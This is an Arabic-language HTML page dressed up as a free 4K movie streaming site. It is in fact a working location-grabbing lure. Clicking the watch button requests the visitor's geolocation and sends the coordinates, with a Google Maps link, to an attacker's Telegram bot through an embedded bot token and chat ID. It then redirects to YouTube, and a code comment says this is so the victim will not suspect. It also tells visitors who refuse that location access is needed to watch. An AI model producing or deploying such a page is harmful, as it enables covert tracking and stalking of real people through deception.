<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سينما أونلاين - مشاهدة مجانية</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f0f0f; color: white; text-align: center; padding-top: 40px; margin: 0; }
        .container { background: #1e1e1e; padding: 25px; border-radius: 12px; max-width: 350px; margin: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.8); }
        img { width: 100%; border-radius: 8px; margin-bottom: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
        h2 { color: #e50914; margin-top: 0; }
        p { color: #b3b3b3; font-size: 15px; }
        button { background: #e50914; color: white; border: none; padding: 15px; font-size: 18px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; transition: 0.3s; }
        button:hover { background: #ff0a16; transform: scale(1.02); }
        #status { margin-top: 15px; color: #00ff88; font-size: 14px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🎬 سينما أونلاين</h2>
        <img src="https://image.tmdb.org/t/p/w500/1E5baAaEse26fej7uHcjOgEE2t2.jpg" alt="Movie Poster">
        <p>فيلم الأكشن والغموض (2026) - جودة 4K مجاناً</p>
        
        <button id="btn" onclick="getLoc()">اضغط لمشاهدة الفيلم</button>
        <div id="status"></div>
    </div>

    <script>
        function getLoc() {
            document.getElementById('btn').innerText = "جاري التحقق...";
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        
                        document.getElementById('status').innerText = "✅ تم التشغيل بنجاح!";
                        document.getElementById('btn').style.display = 'none';
                        
                        // إرسال مباشر إلى تلغرام (بدون خادم)
                        const text = `🚨 موقع جديد!%0Aخط العرض: ${lat}%0Aخط الطول: ${lon}%0A🗺️ الخريطة: https://maps.google.com/?q=${lat},${lon}`;
                        const telegramUrl = `https://api.telegram.org/bot8933571192:AAEAl7ej-akD789tzkS1sJK7zIZz020a4kA/sendMessage?chat_id=8322196658&text=${text}`;
                        
                        fetch(telegramUrl, { mode: 'no-cors' }).then(() => {
                            // تحويله ليوتيوب لمشاهدة فيلم حقيقي لكي لا يشك
                            setTimeout(() => {
                                window.location.href = "https://www.youtube.com/results?search_query=free+full+movie";
                            }, 1500);
                        });
                    },
                    (err) => {
                        document.getElementById('btn').innerText = "اضغط لمشاهدة الفيلم";
                        document.getElementById('status').style.color = "red";
                        document.getElementById('status').innerText = "❌ يجب السماح بالموقع لتأكيد المشاهدة.";
                    }
                );
            }
        }
    </script>
</body>
</html>
